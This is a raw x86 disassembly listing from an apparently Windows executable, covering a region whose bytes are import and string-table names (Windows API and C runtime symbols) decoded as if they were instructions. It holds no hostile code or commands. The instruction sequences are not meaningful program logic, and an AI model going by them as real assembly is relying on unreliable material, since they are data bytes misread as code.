  4131f5:	inc    ebp
  4131f6:	jb     0x41326a
  4131f8:	outs   dx,DWORD PTR ds:[esi]
  4131f9:	jb     0x4131fb
  4131fb:	add    BYTE PTR [ecx],ch
  4131fd:	add    al,BYTE PTR [edi+0x65]
  413200:	je     0x413252
  413202:	jb     0x413273
  413204:	arpl   WORD PTR [ecx+0x64],ax
  413207:	fs jb  0x41326f
  41320a:	jae    0x41327f
  41320c:	add    BYTE PTR [eax],al
  41320e:	add    BYTE PTR [ecx],0x46
  413211:	jb     0x413278
  413213:	gs dec esp
  413215:	imul   esp,DWORD PTR [edx+0x72],0x797261
  41321c:	rol    BYTE PTR [ecx],1
  41321e:	inc    edi
  41321f:	gs je  0x413266
  413222:	popa   
  413223:	je     0x41328a
  413225:	inc    esi
  413226:	outs   dx,DWORD PTR ds:[esi]
  413227:	jb     0x413296
  413229:	popa   
  41322a:	je     0x41326d
  41322c:	add    BYTE PTR [eax],al
  41322e:	outs   dx,DWORD PTR ds:[esi]
  41322f:	add    al,BYTE PTR [edi+0x65]
  413232:	je     0x413288
  413234:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41323b:	popa   
  41323c:	je     0x41327f
  41323e:	add    BYTE PTR [eax],al
  413240:	jge    0x413246
  413242:	push   esi
  413243:	gs jb  0x4132af
  413246:	data16 jns 0x41329f
  413249:	gs jb  0x4132bf
  41324c:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  413253:	push   edi
  413254:	add    BYTE PTR [eax],al
  413256:	xchg   edi,eax
  413257:	add    al,BYTE PTR [edi+0x6c]
  41325a:	outs   dx,DWORD PTR ds:[esi]
  41325b:	bound  esp,QWORD PTR [ecx+0x6c]
  41325e:	push   edx
  41325f:	gs inc ecx
  413261:	ins    BYTE PTR es:[edi],dx
  413262:	ins    BYTE PTR es:[edi],dx
  413263:	outs   dx,DWORD PTR ds:[esi]
  413264:	arpl   WORD PTR [eax],ax
  413266:	fild   DWORD PTR [eax]
  413268:	inc    ebx
  413269:	jb     0x4132d0
  41326b:	popa   
  41326c:	je     0x4132d3
  41326e:	dec    ebp
  41326f:	popa   
  413270:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  413278:	in     al,0x3
  41327a:	push   ebx
  41327b:	gs je  0x4132c1
  41327e:	outs   dx,DWORD PTR ds:[esi]
  41327f:	ins    DWORD PTR es:[edi],dx
  413280:	ins    DWORD PTR es:[edi],dx
  413281:	push   esp
  413282:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  413289:	add    BYTE PTR [edx+eax*1+0x47],dl
  41328d:	gs je  0x4132e3
  413290:	jns    0x413305
  413292:	je     0x4132f9
  413294:	ins    DWORD PTR es:[edi],dx
  413295:	push   esp
  413296:	imul   ebp,DWORD PTR [ebp+0x65],0x47025000
  41329d:	gs je  0x4132f3
  4132a0:	jns    0x413315
  4132a2:	je     0x413309
  4132a4:	ins    DWORD PTR es:[edi],dx
  4132a5:	inc    esp
  4132a6:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4132ad:	jns    0x413306
  4132af:	add    bl,cl
  4132b1:	add    cl,BYTE PTR [ecx+0x73]
  4132b4:	inc    edx
  4132b5:	popa   
  4132b6:	fs push edx
  4132b8:	gs popa 
  4132ba:	fs push eax
  4132bc:	je     0x413330
  4132be:	add    BYTE PTR [eax],al
  4132c0:	mov    eax,ds:0x61654802
  4132c5:	jo     0x413308
  4132c7:	ins    BYTE PTR es:[edi],dx
  4132c8:	ins    BYTE PTR es:[edi],dx
  4132c9:	outs   dx,DWORD PTR ds:[esi]
  4132ca:	arpl   WORD PTR [eax],ax
  4132cc:	and    al,BYTE PTR [ecx]
  4132ce:	inc    ebp
  4132cf:	outs   dx,BYTE PTR ds:[esi]
  4132d0:	jne    0x41333f
  4132d2:	push   edx
  4132d3:	gs jae 0x413345
  4132d6:	jne    0x41334a
  4132d8:	arpl   WORD PTR [ebp+0x54],sp
  4132db:	jns    0x41334d
  4132dd:	gs jae 0x413321
  4132e0:	add    BYTE PTR [eax],al
  4132e2:	push   es
  4132e3:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  4132e7:	fs dec esp
  4132e9:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  4132f0:	js     0x413333
  4132f2:	add    BYTE PTR [eax],al
  4132f4:	mov    bl,0x0
  4132f6:	inc    ebx
  4132f7:	outs   dx,DWORD PTR ds:[esi]
  4132f8:	ins    DWORD PTR es:[edi],dx
  4132f9:	jo     0x41335c
  4132fb:	jb     0x413362
  4132fd:	push   ebx
  4132fe:	je     0x413372
  413300:	imul   ebp,DWORD PTR [esi+0x67],0x12000041
  413307:	add    al,0x53
  413309:	gs je  0x413351
  41330c:	jb     0x413380
  41330e:	outs   dx,DWORD PTR ds:[esi]
  41330f:	jb     0x41335e
  413311:	outs   dx,DWORD PTR ds:[esi]
  413312:	fs add BYTE PTR gs:[eax],al
  413316:	out    0x0,al
  413318:	inc    ebx
  413319:	jb     0x413380
  41331b:	popa   
  41331c:	je     0x413383
  41331e:	push   edx
  41331f:	gs ins DWORD PTR es:[edi],dx
  413321:	outs   dx,DWORD PTR ds:[esi]
  413322:	je     0x413389
  413324:	push   esp
  413325:	push   0x64616572
  41332a:	add    BYTE PTR [eax],al
  41332c:	pop    DWORD PTR [edx]
  41332e:	inc    edi
  41332f:	ins    BYTE PTR es:[edi],dx
  413330:	outs   dx,DWORD PTR ds:[esi]
  413331:	bound  esp,QWORD PTR [ecx+0x6c]
  413334:	inc    esi
  413335:	ins    BYTE PTR es:[edi],dx
  413336:	popa   
  413337:	addr16 jae 0x41333a
  41333a:	mov    es,WORD PTR [edi+edx*2]
  41333d:	popa   
  41333e:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
  413346:	ins    BYTE PTR es:[di],dx
  413348:	gs dec edi
  41334a:	bound  ebp,QWORD PTR [edx+0x65]
  41334d:	arpl   WORD PTR [eax+eax*1+0x18],si
  413351:	add    al,BYTE PTR [edi+0x65]
  413354:	je     0x4133a4
  413356:	jne    0x4133c5
  413358:	bound  esp,QWORD PTR [ebp+0x72]
  41335b:	inc    esi
  41335c:	outs   dx,DWORD PTR ds:[esi]
  41335d:	jb     0x4133cc
  41335f:	popa   
  413360:	je     0x4133b9
  413362:	add    BYTE PTR [eax],al
  413364:	xchg   ebx,eax
  413365:	add    al,0x57
  413367:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x54726168
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	dec    ebp
  413371:	jne    0x4133df
  413373:	je     0x4133de
  413375:	inc    edx
  413376:	jns    0x4133ec
  413378:	add    BYTE PTR gs:[ebp+0x2],cl
  41337c:	inc    edi
  41337d:	gs je  0x4133d3
  413380:	jns    0x4133f5
  413382:	je     0x4133e9
  413384:	ins    DWORD PTR es:[edi],dx
  413385:	inc    esp
  413386:	gs popaw 
  413389:	jne    0x4133f7
  41338b:	je     0x4133e2
  41338d:	dec    ecx
  41338e:	dec    esp
  41338f:	popa   
  413390:	outs   dx,BYTE PTR ds:[esi]
  413391:	addr16 jne 0x4133f5
  413394:	add    BYTE PTR gs:[bx+si],al
  413398:	test   DWORD PTR [edx],eax
  41339a:	inc    edi
  41339b:	gs je  0x4133f5
  41339e:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  4133a5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4133ac:	jns    0x413405
  4133ae:	add    BYTE PTR [eax],al
  4133b0:	jl     0x4133b2
  4133b2:	inc    ecx
  4133b3:	fs fs inc ecx
  4133b6:	je     0x413427
  4133b8:	ins    DWORD PTR es:[edi],dx
  4133b9:	inc    ecx
  4133ba:	add    BYTE PTR [eax],al
  4133bc:	stos   BYTE PTR es:[edi],al
  4133bd:	add    BYTE PTR [ebx+0x6c],al
  4133c0:	gs popa 
  4133c2:	jb     0x413407
  4133c4:	outs   dx,DWORD PTR ds:[esi]
  4133c5:	ins    DWORD PTR es:[edi],dx
  4133c6:	ins    DWORD PTR es:[edi],dx
  4133c7:	inc    ebp
  4133c8:	jb     0x41343c
  4133ca:	outs   dx,DWORD PTR ds:[esi]
  4133cb:	jb     0x4133cd
  4133cd:	add    ch,al
  4133cf:	add    al,0x6c
  4133d1:	jae    0x413447
  4133d3:	jb     0x413438
  4133d5:	ins    DWORD PTR es:[edi],dx
  4133d6:	jo     0x413441
  4133d8:	inc    ecx
  4133d9:	add    BYTE PTR [esi],dh
  4133db:	add    al,0x53
  4133dd:	gs je  0x413434
  4133e0:	push   0x64616572
  4133e5:	inc    ebx
  4133e6:	outs   dx,DWORD PTR ds:[esi]
  4133e7:	outs   dx,BYTE PTR ds:[esi]
  4133e8:	je     0x41344f
  4133ea:	js     0x413460
  4133ec:	add    BYTE PTR [eax],al
  4133ee:	repnz add BYTE PTR [ebx+0x72],al
  4133f2:	gs popa 
  4133f4:	je     0x41345b
  4133f6:	push   edi
  4133f7:	popa   
  4133f8:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  413400:	ins    DWORD PTR es:[edi],dx
  413401:	gs jb  0x413445
  413404:	add    BYTE PTR [eax],al
  413406:	mov    BYTE PTR [esp+ebp*2],0x73
  41340a:	je     0x41347e
  41340c:	arpl   WORD PTR [ebp+0x70],bp
  41340f:	imul   edx,DWORD PTR [edi+0x0],0x724300d3
  413416:	gs popa 
  413418:	je     0x41347f
  41341a:	inc    esi
  41341b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x53044c00
  413423:	imul   edi,DWORD PTR [edx+0x65],0x6552666f
  41342a:	jae    0x41349b
  41342c:	jne    0x4134a0
  41342e:	arpl   WORD PTR [ebp+0x0],sp
  413431:	add    BYTE PTR [eax],cl
  413433:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  413437:	fs dec esp
  413439:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  413440:	add    BYTE PTR [eax],al
  413442:	mov    al,BYTE PTR [ecx]
  413444:	inc    edi
  413445:	gs je  0x413489
  413448:	inc    ebx
  413449:	push   eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	pop    ss
  41344d:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  413451:	imul   eax,DWORD PTR [esi+0x69],0x6c
  413455:	add    BYTE PTR gs:[eax],al
  413458:	dec    ebx
  413459:	inc    ebp
  41345a:	push   edx
  41345b:	dec    esi
  41345c:	inc    ebp
  41345d:	dec    esp
  41345e:	xor    esi,DWORD PTR [edx]
  413460:	cs fs ins BYTE PTR es:[edi],dx
  413463:	ins    BYTE PTR es:[edi],dx
  413464:	add    BYTE PTR [eax],al
  413466:	add    al,0x0
  413468:	inc    ebx
  413469:	push   0x65736f6f
  41346e:	inc    esi
  41346f:	outs   dx,DWORD PTR ds:[esi]
  413470:	outs   dx,BYTE PTR ds:[esi]
  413471:	je     0x4134ca
  413473:	add    BYTE PTR [edi],dl
  413475:	add    BYTE PTR [eax+0x72],dl
  413478:	imul   ebp,DWORD PTR [esi+0x74],0x57676c44
  41347f:	add    BYTE PTR [esi],cl
  413481:	add    BYTE PTR [edi+0x65],al
  413484:	je     0x4134d5
  413486:	jo     0x4134ed
  413488:	outs   dx,BYTE PTR ds:[esi]
  413489:	inc    esi
  41348a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  413492:	add    BYTE PTR [eax],al
  413494:	or     al,BYTE PTR [eax]
  413496:	inc    esi
  413497:	imul   ebp,DWORD PTR [esi+0x64],0x74786554
  41349e:	push   edi
  41349f:	add    BYTE PTR [ebx+0x6f],ah
  4134a2:	ins    DWORD PTR es:[edi],dx
  4134a3:	fs ins BYTE PTR es:[edi],dx
  4134a5:	xor    esi,DWORD PTR [bp+si]
  4134a8:	cs fs ins BYTE PTR es:[edi],dx
  4134ab:	ins    BYTE PTR es:[edi],dx
  4134ac:	add    BYTE PTR [eax],al
  4134ae:	cmc    
  4134af:	add    BYTE PTR [edi+0x63],bl
  4134b2:	outs   dx,DWORD PTR ds:[esi]
  4134b3:	outs   dx,BYTE PTR ds:[esi]
  4134b4:	je     0x413528
  4134b6:	outs   dx,DWORD PTR ds:[esi]
  4134b7:	ins    BYTE PTR es:[edi],dx
  4134b8:	data16 jo 0x4134bb
  4134bb:	add    BYTE PTR [ebx+0x735f5f00],dh
  4134c1:	gs je  0x413523
  4134c4:	popa   
  4134c5:	jo     0x413537
  4134c7:	pop    edi
  4134c8:	je     0x413543
  4134ca:	jo     0x413531
  4134cc:	add    BYTE PTR [eax],al
  4134ce:	mov    al,ds:0x705f5f00
  4134d3:	pop    edi
  4134d4:	pop    edi
  4134d5:	ins    WORD PTR es:[edi],dx
  4134d7:	outs   dx,DWORD PTR ds:[esi]
  4134d8:	fs add BYTE PTR gs:[eax],al
  4134dc:	ins    DWORD PTR es:[edi],dx
  4134dd:	add    esp,DWORD PTR [esi+0x67]
  4134e0:	gs je  0x413546
  4134e3:	add    BYTE PTR [ebx+0x705f5f00],bl
  4134e9:	pop    edi
  4134ea:	pop    edi
  4134eb:	arpl   WORD PTR [edi+0x6d],bp
  4134ee:	ins    DWORD PTR es:[edi],dx
  4134ef:	outs   dx,DWORD PTR ds:[esi]
  4134f0:	fs add BYTE PTR gs:[eax],al
  4134f4:	mov    bh,0x3
  4134f6:	ins    DWORD PTR es:[edi],dx
  4134f7:	bound  esi,QWORD PTR [ebx+0x74]
  4134fa:	outs   dx,DWORD PTR ds:[esi]
  4134fb:	ja     0x413560
  4134fd:	jae    0x4134ff
  4134ff:	add    bl,bl
  413501:	add    BYTE PTR [edi+0x61],bl
  413504:	ins    DWORD PTR es:[edi],dx
  413505:	jae    0x41356e
  413507:	pop    edi
  413508:	gs js  0x413574
  41350b:	je     0x41350d
  41350d:	add    BYTE PTR [ebx+0x65736603],al
  413513:	imul   eax,DWORD PTR gs:[eax],0xffffff86
  413517:	add    DWORD PTR [edi+0x69],ebx
  41351a:	outs   dx,BYTE PTR ds:[esi]
  41351b:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x33006d72
  413523:	add    al,0x77
  413525:	arpl   WORD PTR [ebx+0x74],si
  413528:	outs   dx,DWORD PTR ds:[esi]
  413529:	imul   eax,DWORD PTR [eax],0x0
  41352c:	xchg   esp,eax
  41352d:	add    ebp,DWORD PTR [ecx+0x73]
  413530:	popa   
  413531:	ins    BYTE PTR es:[edi],dx
  413532:	outs   dx,BYTE PTR ds:[esi]
  413533:	jne    0x4135a2
  413535:	add    BYTE PTR [esi],al
  413537:	add    al,0x74
  413539:	imul   ebp,DWORD PTR [ebp+0x65],0x41c0000
  413540:	ja     0x4135a5
  413542:	jae    0x4135a7
  413544:	popa   
  413545:	je     0x413547
  413547:	add    al,ch
  413549:	add    esi,DWORD PTR [ebx+0x74]
  41354c:	jb     0x4135b1
  41354e:	jo     0x4135c9
  413550:	add    BYTE PTR [eax],al
  413552:	out    0x3,eax
  413554:	jae    0x4135ca
  413556:	jb     0x4135bb
  413558:	outs   dx,DWORD PTR ds:[esi]
  413559:	ins    BYTE PTR es:[edi],dx
  41355a:	ins    BYTE PTR es:[edi],dx
  41355b:	add    BYTE PTR [esi],dh
  41355d:	add    al,0x77
  41355f:	arpl   WORD PTR [ebx+0x74],si
  413562:	outs   dx,DWORD PTR ds:[esi]
  413563:	ins    DWORD PTR es:[edi],dx
  413564:	bound  esi,QWORD PTR [ebx+0x0]
  413567:	add    BYTE PTR [edi+0x3],bl
  41356a:	arpl   WORD PTR [ebp+eiz*2+0x61],bp
  41356e:	jb     0x4135d5
  413570:	jb     0x4135e4
  413572:	add    BYTE PTR [eax],al
  413574:	jmp    0x7363:0x72747303
  41357b:	jo     0x4135eb
  41357d:	add    ch,ah
  41357f:	add    esi,DWORD PTR [ebx+0x74]
  413582:	jb     0x4135e7
  413584:	push   0x1000072
  413589:	add    al,0x73
  41358b:	ja     0x413600
  41358d:	arpl   WORD PTR [ecx+0x6e],sp
  413590:	data16 add BYTE PTR [esi+0x73695f01],bl
  413597:	ins    DWORD PTR es:[edi],dx
  413598:	bound  esp,QWORD PTR [edx+0x6c]
  41359b:	gs popa 
  41359d:	add    BYTE PTR fs:[eax],al
  4135a0:	int3   
  4135a1:	add    esi,DWORD PTR [ecx+0x73]
  4135a4:	outs   dx,DWORD PTR ds:[esi]
  4135a5:	jb     0x41361b
  4135a7:	add    BYTE PTR [ebx],cl
  4135a9:	add    al,0x74
  4135ab:	outs   dx,DWORD PTR ds:[esi]
  4135ac:	ja     0x41361a
  4135ae:	outs   dx,DWORD PTR ds:[esi]
  4135af:	ja     0x413616
  4135b1:	jb     0x4135b3
  4135b3:	add    BYTE PTR [ebp+0x6c616d03],dh
  4135b9:	ins    BYTE PTR es:[edi],dx
  4135ba:	outs   dx,DWORD PTR ds:[esi]
  4135bb:	arpl   WORD PTR [eax],ax
  4135bd:	add    BYTE PTR [ebx],al
  4135bf:	add    al,0x73
  4135c1:	jns    0x413636
  4135c3:	je     0x41362a
  4135c5:	ins    DWORD PTR es:[edi],dx
  4135c6:	add    BYTE PTR [eax],al
  4135c8:	sub    al,0x4
  4135ca:	ja     0x41362f
  4135cc:	jae    0x41363e
  4135ce:	bound  esi,QWORD PTR [edx+0x6b]
  4135d1:	add    BYTE PTR [eax],bl
  4135d3:	add    al,0x76
  4135d5:	jae    0x41364e
  4135d7:	jo     0x41364b
  4135d9:	imul   ebp,DWORD PTR [esi+0x74],0x520066
  4135e0:	pop    edi
  4135e1:	pop    eax
  4135e2:	arpl   WORD PTR [eax+0x74],si
  4135e5:	inc    esi
  4135e6:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4160072
  4135ee:	jbe    0x413663
  4135f0:	jo     0x413664
  4135f2:	imul   ebp,DWORD PTR [esi+0x74],0x78000066
  4135f9:	add    esp,DWORD PTR [esi+0x70]
  4135fc:	jne    0x413672
  4135fe:	arpl   WORD PTR [eax],ax
  413600:	mov    cl,0x3
  413602:	ins    BYTE PTR es:[edi],dx
  413603:	outs   dx,DWORD PTR ds:[esi]
  413604:	arpl   WORD PTR [ecx+0x6c],sp
  413607:	je     0x413672
  413609:	ins    DWORD PTR es:[edi],dx
  41360a:	add    BYTE PTR gs:[ebx+eax*1+0x66],ch
  41360f:	data16 ins BYTE PTR es:[edi],dx
  413611:	jne    0x413686
  413613:	push   0x41e0000
  413618:	ja     0x41367d
  41361a:	jae    0x41367f
  41361c:	push   0x23000072
  413621:	add    DWORD PTR [edi+0x65],ebx
  413624:	js     0x41368f
  413626:	je     0x413628
  413628:	pop    ebp
  413629:	add    esp,DWORD PTR [ebx+0x61]
  41362c:	ins    BYTE PTR es:[edi],dx
  41362d:	ins    BYTE PTR es:[edi],dx
  41362e:	outs   dx,DWORD PTR ds:[esi]
  41362f:	arpl   WORD PTR [eax],ax
  413631:	add    cl,bl
  413633:	add    esi,DWORD PTR [ebx+0x65]
  413636:	je     0x4136ae
  413638:	bound  esi,QWORD PTR [ebp+0x66]
  41363b:	add    BYTE PTR [ebx+0x70736903],bl
  413641:	jb     0x4136ac
  413643:	outs   dx,BYTE PTR ds:[esi]
  413644:	je     0x413646
  413646:	or     eax,0x676e7504
  41364b:	gs je  0x4136b1
  41364e:	add    BYTE PTR [eax],al
  413650:	cmp    BYTE PTR [edi+esi*2],al
  413653:	arpl   WORD PTR [ebx+0x74],si
  413656:	outs   dx,DWORD PTR ds:[esi]
  413657:	jne    0x4136c5
  413659:	add    al,ch
  41365b:	add    BYTE PTR [edi+0x63],bl
  41365e:	gs js  0x4136ca
  413661:	je     0x413663
  413663:	add    BYTE PTR [ebx+0x3],bl
  413666:	bound  esi,QWORD PTR [ebx+0x65]
  413669:	popa   
  41366a:	jb     0x4136cf
  41366c:	push   0x5f00b500
  413671:	pop    edi
  413672:	jae    0x4136d9
  413674:	je     0x4136eb
  413676:	jae    0x4136dd
  413678:	jb     0x4136e7
  41367a:	popa   
  41367b:	je     0x4136e5
  41367d:	gs jb  0x4136f2
  413680:	add    BYTE PTR [eax],al
  413682:	jb     0x413684
  413684:	pop    edi
  413685:	pop    edi
  413686:	addr16 gs je 0x4136f7
  41368a:	popa   
  41368b:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413692:	enter  0x7003,0x75
  413696:	je     0x4136fb
  413698:	push   0x4d007261
  41369d:	push   ebx
  41369e:	push   esi
  41369f:	inc    ebx
  4136a0:	push   edx
  4136a1:	push   esp
  4136a2:	cs fs ins BYTE PTR es:[edi],dx
  4136a5:	ins    BYTE PTR es:[edi],dx
  4136a6:	add    BYTE PTR [eax],al
  4136a8:	push   edi
  4136a9:	add    BYTE PTR [ecx+0x6e],cl
  4136ac:	imul   esi,DWORD PTR [ebx+eax*2+0x6f],0x6e6f6d6d
  4136b4:	inc    ebx
  4136b5:	outs   dx,DWORD PTR ds:[esi]
  4136b6:	outs   dx,BYTE PTR ds:[esi]
  4136b7:	je     0x41372b
  4136b9:	outs   dx,DWORD PTR ds:[esi]
  4136ba:	ins    BYTE PTR es:[edi],dx
  4136bb:	jae    0x413702
  4136bd:	js     0x4136bf
  4136bf:	add    BYTE PTR [ebp+0x0],al
  4136c2:	dec    ecx
  4136c3:	ins    DWORD PTR es:[edi],dx
  4136c4:	popa   
  4136c5:	addr16 gs dec esp
  4136c8:	imul   esi,DWORD PTR [ebx+0x74],0x616f4c5f
  4136cf:	fs dec ecx
  4136d1:	ins    DWORD PTR es:[edi],dx
  4136d2:	popa   
  4136d3:	addr16 gs push edi
  4136d6:	add    BYTE PTR [eax],al
  4136d8:	adc    eax,DWORD PTR [eax]
  4136da:	inc    ebx
  4136db:	jb     0x413742
  4136dd:	popa   
  4136de:	je     0x413745
  4136e0:	push   eax
  4136e1:	jb     0x413752
  4136e3:	jo     0x41374a
  4136e5:	jb     0x41375b
  4136e7:	jns    0x41373c
  4136e9:	push   0x50746565
  4136ee:	popa   
  4136ef:	addr16 gs push edi
  4136f2:	add    BYTE PTR [eax],al
  4136f4:	dec    esi
  4136f5:	add    BYTE PTR [ecx+0x6d],cl
  4136f8:	popa   
  4136f9:	addr16 gs dec esp
  4136fc:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413703:	ins    BYTE PTR es:[edi],dx
  413704:	popa   
  413705:	arpl   WORD PTR [ebp+0x49],sp
  413708:	arpl   WORD PTR [edi+0x6e],bp
  41370b:	add    BYTE PTR [edi],bh
  41370d:	add    BYTE PTR [ecx+0x6d],cl
  413710:	popa   
  413711:	addr16 gs dec esp
  413714:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  41371b:	dec    ecx
  41371c:	arpl   WORD PTR [edi+0x6e],bp
  41371f:	push   ebx
  413720:	imul   edi,DWORD PTR [edx+0x65],0x49003e00
  413727:	ins    DWORD PTR es:[edi],dx
  413728:	popa   
  413729:	addr16 gs dec esp
  41372c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  413733:	dec    ecx
  413734:	arpl   WORD PTR [edi+0x6e],bp
  413737:	add    BYTE PTR [ebx+0x4f],al
  41373a:	dec    ebp
  41373b:	inc    ebx
  41373c:	push   esp
  41373d:	dec    esp
  41373e:	xor    esi,DWORD PTR [edx]
  413740:	cs fs ins BYTE PTR es:[edi],dx
  413743:	ins    BYTE PTR es:[edi],dx
  413744:	add    BYTE PTR [eax],al
  413746:	les    eax,FWORD PTR [eax]
  413748:	inc    ebp
  413749:	outs   dx,BYTE PTR ds:[esi]
  41374a:	jne    0x4137b9
  41374c:	inc    esi
  41374d:	outs   dx,DWORD PTR ds:[esi]
  41374e:	outs   dx,BYTE PTR ds:[esi]
  41374f:	je     0x413797
  413751:	popa   
  413752:	ins    DWORD PTR es:[edi],dx
  413753:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41375b:	add    ah,bl
  41375d:	add    DWORD PTR [ebx+0x65],edx
  413760:	je     0x4137a6
  413762:	dec    ecx
  413763:	inc    edx
  413764:	inc    ebx
  413765:	outs   dx,DWORD PTR ds:[esi]
  413766:	ins    BYTE PTR es:[edi],dx
  413767:	outs   dx,DWORD PTR ds:[esi]
  413768:	jb     0x4137be
  41376a:	popa   
  41376b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41376f:	add    ch,dl
  413771:	add    BYTE PTR [ebp+0x78],al
  413774:	je     0x4137ca
  413776:	gs js  0x4137ed
  413779:	dec    edi
  41377a:	jne    0x4137f0
  41377c:	push   edi
  41377d:	add    BYTE PTR [edx+0x65724300],ah
  413783:	popa   
  413784:	je     0x4137eb
  413786:	dec    ecx
  413787:	inc    ebx
  413788:	push   edi
  413789:	add    BYTE PTR [ecx+0x6d6f4300],al
  41378f:	bound  ebp,QWORD PTR [ecx+0x6e]
  413792:	gs push edx
  413794:	outs   dx,BYTE PTR ds:[si]
  413796:	add    BYTE PTR [eax],al
  413798:	mov    bl,0x0
  41379a:	inc    esp
  41379b:	gs ins BYTE PTR es:[edi],dx
  41379d:	gs je  0x413805
  4137a0:	inc    esp
  4137a1:	inc    ebx
  4137a2:	add    BYTE PTR [eax],al
  4137a4:	inc    ecx
  4137a5:	add    DWORD PTR [edi+0x65],eax
  4137a8:	je     0x4137ee
  4137aa:	gs jbe 0x413816
  4137ad:	arpl   WORD PTR [ebp+0x43],sp
  4137b0:	popa   
  4137b1:	jo     0x413826
  4137b3:	add    BYTE PTR [ecx],ah
  4137b5:	add    DWORD PTR [edi+0x65],eax
  4137b8:	je     0x4137fc
  4137ba:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4137c2:	jae    0x4137c4
  4137c4:	mov    DWORD PTR [ecx],0x65766153
  4137ca:	inc    esp
  4137cb:	inc    ebx
  4137cc:	add    BYTE PTR [eax],al
  4137ce:	jne    0x4137d0
  4137d0:	inc    edx
  4137d1:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  4137da:	add    DWORD PTR [ecx],0x47
  4137dd:	gs je  0x413834
  4137e0:	gs js  0x413857
  4137e3:	inc    ebp
  4137e4:	js     0x41385a
  4137e6:	outs   dx,BYTE PTR gs:[esi]
  4137e8:	je     0x41383a
  4137ea:	outs   dx,DWORD PTR ds:[esi]
  4137eb:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4137f2:	stos   BYTE PTR es:[edi],al
  4137f3:	add    BYTE PTR [ebx+0x72],al
  4137f6:	gs popa 
  4137f8:	je     0x41385f
  4137fa:	push   eax
  4137fb:	outs   dx,DWORD PTR ds:[esi]
  4137fc:	ins    BYTE PTR es:[edi],dx
  4137fd:	jns    0x413866
  4137ff:	outs   dx,DWORD PTR ds:[esi]
  413800:	outs   dx,BYTE PTR ds:[esi]
  413801:	push   edx
  413802:	outs   dx,BYTE PTR ds:[si]
  413804:	add    BYTE PTR [eax],al
  413806:	xchg   ebx,eax
  413807:	add    BYTE PTR [ebx+0x72],al
  41380a:	gs popa 
  41380c:	je     0x413873
  41380e:	inc    esp
  41380f:	dec    ecx
  413810:	inc    edx
  413811:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb6000070
  413819:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  41381d:	gs je  0x413885
  413820:	dec    edi
  413821:	bound  ebp,QWORD PTR [edx+0x65]
  413824:	arpl   WORD PTR [eax+eax*1+0x0],si
  413828:	outs   dx,BYTE PTR ds:[esi]
  413829:	add    DWORD PTR [edi+0x65],eax
  41382c:	je     0x41387e
  41382e:	imul   edi,DWORD PTR [eax+0x65],0x8900006c
  413835:	add    BYTE PTR [ebx+0x72],al
  413838:	gs popa 
  41383a:	je     0x4138a1
  41383c:	inc    edx
  41383d:	jb     0x4138b4
  41383f:	jae    0x4138a9
  413841:	dec    ecx
  413842:	outs   dx,BYTE PTR ds:[esi]
  413843:	imul   esi,DWORD PTR fs:[edx+0x65],0x8a007463
  41384b:	add    DWORD PTR [edi+0x65],eax
  41384e:	je     0x4138a4
  413850:	gs js  0x4138c7
  413853:	dec    ebp
  413854:	gs je  0x4138c9
  413857:	imul   esp,DWORD PTR [ebx+0x73],0x870041
  41385e:	inc    ebx
  41385f:	jb     0x4138c6
  413861:	popa   
  413862:	je     0x4138c9
  413864:	inc    edx
  413865:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd3000070
  41386d:	add    DWORD PTR [ebx+0x65],edx
  413870:	je     0x4138b4
  413872:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  41387a:	outs   dx,BYTE PTR gs:[esi]
  41387c:	jae    0x4138e7
  41387e:	outs   dx,DWORD PTR ds:[esi]
  41387f:	outs   dx,BYTE PTR ds:[esi]
  413880:	inc    ebp
  413881:	js     0x413883
  413883:	add    BYTE PTR [edx+0x65724300],bl
  413889:	popa   
  41388a:	je     0x4138f1
  41388c:	inc    esi
  41388d:	outs   dx,DWORD PTR ds:[esi]
  41388e:	outs   dx,BYTE PTR ds:[esi]
  41388f:	je     0x4138da
  413891:	outs   dx,BYTE PTR ds:[esi]
  413892:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41389a:	iret   
  41389b:	add    DWORD PTR [ebx+0x65],edx
  41389e:	ins    BYTE PTR es:[edi],dx
  41389f:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4138a4:	ins    BYTE PTR es:[edi],dx
  4138a5:	gs je  0x41391c
  4138a8:	gs add dh,al
  4138ab:	add    DWORD PTR [edx+0x6f],edx
  4138ae:	jne    0x41391e
  4138b0:	fs push edx
  4138b2:	arpl   WORD PTR gs:[eax+eax*1-0x50],si
  4138b7:	add    BYTE PTR [ebx+0x72],al
  4138ba:	gs popa 
  4138bc:	je     0x413923
  4138be:	push   ebx
  4138bf:	outs   dx,DWORD PTR ds:[esi]
